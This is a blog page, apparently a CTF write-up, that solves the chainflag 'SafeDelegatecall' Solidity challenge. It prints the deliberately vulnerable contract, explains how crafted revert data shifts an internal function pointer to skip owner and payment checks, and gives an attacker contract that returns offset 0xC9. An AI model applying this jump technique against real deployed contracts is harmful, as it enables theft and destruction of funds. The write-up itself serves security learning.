@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      06.delegatecall(SafaDelegatecall) 
+      
+      
+      |
+    
+     solidity life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">06.delegatecall(SafaDelegatecall)</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-06-23 20:19:22
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/02-chainflag-ctf/" title="02.chainflag ctf">
+                    <b>#</b> 02.chainflag ctf
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="delegatecall-SafaDelegatecall"><a href="#delegatecall-SafaDelegatecall" class="headerlink" title="delegatecall(SafaDelegatecall)"></a>delegatecall(SafaDelegatecall)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract SafeDelegatecall &#123;</span><br><span class="line"></span><br><span class="line">    address private owner;</span><br><span class="line">    bytes4 internal constant SET = bytes4(keccak256(&#x27;fifth(uint256)&#x27;));</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line"></span><br><span class="line">    struct Func &#123;</span><br><span class="line">        function() internal f;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address _target) public payable&#123;</span><br><span class="line">        require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;);</span><br><span class="line"></span><br><span class="line">        bytes4 sel;</span><br><span class="line">        uint val;</span><br><span class="line"></span><br><span class="line">        (sel, val) = getRet();</span><br><span class="line">        require(sel == SET);</span><br><span class="line"></span><br><span class="line">        Func memory func;</span><br><span class="line">        func.f = gift;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(func, sub(mload(func), val))</span><br><span class="line">        &#125;</span><br><span class="line">        func.f();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gift() private &#123;</span><br><span class="line">        payforflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getRet() internal pure returns (bytes4 sel, uint val) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125;</span><br><span class="line">            let ptr := mload(0x40)</span><br><span class="line">            returndatacopy(ptr, 0, 0x24)</span><br><span class="line">            sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)</span><br><span class="line">            val := mload(add(0x04, ptr))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag() public payable onlyOwner &#123;</span><br><span class="line">        require(msg.value == 1, &#x27;I only need a little money!&#x27;);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() payable public&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>Our goal is to trigger the event <code>SendFlag()</code>, but only owner could call it and no code can set owner. Let’s look at <code>execute()</code>, maybe it can do something.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function execute(address _target) public payable&#123;</span><br><span class="line">    require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;);</span><br><span class="line"></span><br><span class="line">    bytes4 sel;</span><br><span class="line">    uint val;</span><br><span class="line"></span><br><span class="line">    (sel, val) = getRet();</span><br><span class="line">    require(sel == SET);</span><br><span class="line"></span><br><span class="line">    Func memory func;</span><br><span class="line">    func.f = gift;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        mstore(func, sub(mload(func), val))</span><br><span class="line">    &#125;</span><br><span class="line">    func.f();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>this is <code>execute()</code> logic: </p>
+<p>(1) call _tartget’s <code>execute()</code>, and it should be execute wrong and return false</p>
+<p>(2) <code>getRet()</code> should return 2 values, one is <code>bytes4(keccak256(&#39;fifth(uint256)&#39;))</code> and the other one “val” is anything u like. But “val” should be a specific value or you can not complete this level.</p>
+<p>(3) <code>func.f = gift</code> and <code>func.f()</code>: it will call <code>gift()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function gift() private &#123;</span><br><span class="line">    payforflag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>(4) assembly</p>
+<ul>
+<li><code>mload(func)</code>: get the address of <code>func</code> in memory ==&gt; get the address of <code>gift</code> in memory, because the <code>struct</code>‘s feature. If you know the EVM storage of <code>struct</code> you can understand it.</li>
+<li><p><code>sub(mload(func), val)</code>: address(gift) - val, and the val is decided by us. So we can create a <em>target</em> contract, and the program execution flow can go anywhere.</p>
+</li>
+<li><p><code>mstore(func, sub(mload(func), val))</code>: place <code>sub(mload(func), val)</code> in the 32 bytes after address <code>sub(mload(func), val)</code>. This means that if we call <code>func.f()</code>, it would jump to the address <code>func</code> and execute the code after the address <code>func</code>. We want to jump to <code>emit SendFlag(msg.sender);</code>, we need to find its address and then we can jump to this code directly without passing the <code>require()</code> and <code>onlyOwner</code></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function payforflag() public payable onlyOwner &#123;</span><br><span class="line">    require(msg.value == 1, &#x27;I only need a little money!&#x27;);</span><br><span class="line">    emit SendFlag(msg.sender);</span><br><span class="line">    selfdestruct(msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>So we should find the “val”. And we should analyses <code>getRet()</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function getRet() internal pure returns (bytes4 sel, uint val) &#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        if iszero(eq(returndatasize, 0x24)) &#123; //0x24=36</span><br><span class="line">            revert(0, 0) </span><br><span class="line">        &#125;</span><br><span class="line">        let ptr := mload(0x40) //0x40=64</span><br><span class="line">        returndatacopy(ptr, 0, 0x24)</span><br><span class="line">        sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        val := mload(add(0x04, ptr))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>returndatasize</code>: size of the last returndata, in our level it is the value that delegatecall returns</li>
+<li><code>eq(returndatasize, 0x24)</code>: if <code>returndatasize</code> is 0x24 bytes?</li>
+<li><code>iszero(eq(returndatasize, 0x24))</code>: 0x24 bytes==&gt;true==&gt;1==&gt; not revert(), or it will revert()</li>
+<li><code>let ptr := mload(0x40)</code>: get the free memory pointer</li>
+<li><code>returndatacopy(ptr, 0, 0x24)</code>: copy s bytes from returndata at position f to mem at position t. In our level, it is put the value that delegatecall returned in the address of ptr(0x40).</li>
+<li><code>mload(ptr)</code>: get 32 bytes after address ptr</li>
+<li><code>sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)</code>: get the first 4 bytes ==&gt; <code>bytes4(keccak256(&#39;fifth(uint256)&#39;))</code></li>
+<li><code>add(0x04, ptr)</code>： pass 4bytes==&gt;pass address(sel)</li>
+<li><code>val := mload(add(0x04, ptr))</code>: get the following 32 bytes==&gt;val, anything we can decide</li>
+</ul>
+<h3 id="search-for-the-“val”"><a href="#search-for-the-“val”" class="headerlink" title="search for the “val”"></a>search for the “val”</h3><p>address(emit …) = address(gift) - val, equal to val = address(gift) - address(emit …), We need to decompile the contract to find the address.</p>
+<p>The title address is in goerli: <code>0x43E9663D23bBafc76630f7c933A028dE85892E40</code>, and I decompile it in this <a target="_blank" rel="noopener" href="https://ethervm.io/decompile/goerli/0x43e9663d23bbafc76630f7c933a028de85892e40">site</a>.</p>
+<p>To find <code>emit SendFlag(msg.sender);</code>, we can search for opcode<code>SELFDESTRUCT</code>.</p>
+<p><img src="https://moe.photo/images/2023/05/23/image-20230523144355736.png" alt></p>
+<p>From this picture, we can infer it contains <code>emit SendFlag(msg.sender)</code> because of <code>LOG1</code> but not contains <code>require()</code> because of no <code>*REVERT</code>, so address <code>03C1</code> is the <code>address(emit ...)</code></p>
+<p>Also, you can find <code>emit SendFlag(msg.sender)</code> throught <code>require(msg.value == 1,&#39;I only need a little money!&#39;)</code> since it only appears once in the contract. From this picture, it approves <code>03c1</code> is right. Jump to <code>emit SendFlag(msg.sender)</code> that makes us escape from the <code>require()</code> check.</p>
+<p><img src="https://moe.photo/images/2023/05/25/image-20230525105908586.png" alt></p>
+<p>To find <code>address(gift)</code>,  we can search with <code>*REVERT</code> and opcode <code>MSTORE</code>. And now we know <code>048a</code> is <code>address(gift)</code></p>
+<p><img src="https://moe.photo/images/2023/05/23/image-20230523145423870.png" alt></p>
+<p><strong>Now we know that: val = address(gift) - address(emit …) = 048A - 03C1 = 1162 - 961 = 201 = C9</strong></p>
+<p>This is a picture created by me, I hope it is helpful for you to understand this level:</p>
+<p><img src="https://moe.photo/images/2023/05/23/image-20230523153157158.png" alt></p>
+<h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SafeDelegatecallAttack &#123;</span><br><span class="line">    bytes4 internal constant SEL = bytes4(keccak256(&#x27;fifth(uint256)&#x27;));</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        bytes4 sel = SEL;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(0, sel)</span><br><span class="line">            mstore(4, 0xC9)</span><br><span class="line">            revert(0, 0x24)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;// 048A - 03C1 = 1162 - 961 = 201 = C9</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>From this level, I know that if we have inline assembly, we can jump to anywhere we like even pass important check! </p>
+<p>Let’s solve it!</p>
+<p><img src="https://moe.photo/images/2023/05/23/image-20230523155021249.png" alt></p>
+<p><img src="https://moe.photo/images/2023/05/23/image-20230523155030533.png" alt></p>
+<p><img src="https://moe.photo/images/2023/05/23/image-20230523155037589.png" alt></p>
+<p>destruct contract successfully</p>
+<p><img src="https://moe.photo/images/2023/05/23/image-20230523155106491.png" alt></p>
+<p>trigger successfully :)</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/06/23/02.chainflag%20ctf/05.delegatecall(CounterStrike)/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-06-23 20:19:22
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/02-chainflag-ctf/" title="02.chainflag ctf">
+                        <b>#</b> 02.chainflag ctf
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/06/23/02.chainflag%20ctf/07.crypto(EVMEnc)/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#delegatecall-SafaDelegatecall"><span class="toc-text">delegatecall(SafaDelegatecall)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#contract"><span class="toc-text">contract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#analyses"><span class="toc-text">analyses</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#code"><span class="toc-text">code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#search-for-the-%E2%80%9Cval%E2%80%9D"><span class="toc-text">search for the “val”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solve"><span class="toc-text">solve</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 06.delegatecall(SafaDelegatecall) + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F06%2F23%2F02.chainflag%2520ctf%2F06.delegatecall(SafaDelegatecall)%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/06/23/02.chainflag%20ctf/06.delegatecall(SafaDelegatecall)/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
